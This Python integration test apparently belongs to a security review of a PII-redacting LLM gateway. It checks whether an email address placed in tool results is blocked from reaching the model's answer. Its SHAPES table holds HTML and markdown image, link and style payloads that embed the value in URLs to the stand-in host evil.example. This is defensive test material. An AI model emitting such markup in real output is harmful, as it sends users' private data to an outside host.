"""Reviewer integration probe for 08-tam-1a r4 (4aecdbc), mounted into the tools container as
backend/tests/integration/test_zz_review_08t1a_r4.py for the run and removed afterwards.

Direct facade path through the real LiteLLM and the fake provider (it answers "hello " + the tool
result, cut at its length limit): the HTML spellings of r3 MAJOR-r3-1 and K-08T1-0022. For each
it prints whether the provider saw the value, whether the placeholder reached the caller's
answer at all (4aecdbc: "the fake provider cuts long answers") and whether the value came back.
"""

import json

import pytest

from tests.integration import test_06b_direct as direct_base
from tests.integration.facade_support import *  # noqa: F403 - fixtures
from tests.integration.litellm_support import fake_requests
from tests.integration.test_06b_direct import EMAIL, TOOL, _tool_turn

facade_settings = direct_base.facade_settings
direct = direct_base.direct

SHAPES = {
    "src NL =": '<img src\n="http:evil.example/?q={v}">',
    "style url http:": '<span style="background:url(http:evil.example/?q={v})">x</span>',
    "object data http:": '<object data="http:evil.example/?q={v}"></object>',
    "a NL href": '<a\nhref="http:evil.example/?q={v}">x</a>',
    "IMG SRC upper": "<IMG SRC=http:evil.example/{v}>",
    "short md image": "![x](//e.x/{v})",
    "plain (control: value comes back)": "kayit {v}",
}


@pytest.mark.usefixtures("clean_litellm")
@pytest.mark.parametrize("shape", list(SHAPES))
def test_zz_r4_direct_html_shapes(direct, shape):
    _, _, _, client = direct
    text = SHAPES[shape].format(v=EMAIL)
    response = client.chat("tooly", messages=_tool_turn(text), tools=[TOOL])
    assert response.status_code == 200, response.text
    content = response.json()["choices"][0]["message"]["content"]
    sent = json.dumps(fake_requests()[-1], ensure_ascii=False)
    print(
        f"PROBE direct {shape}: provider saw value {EMAIL in sent}; "
        f"placeholder in answer {'<<PII_' in content}; value back {EMAIL in content} -> {content!r}"
    )
    if shape.startswith("plain"):
        assert EMAIL in content or EMAIL in sent
    else:
        assert EMAIL not in content
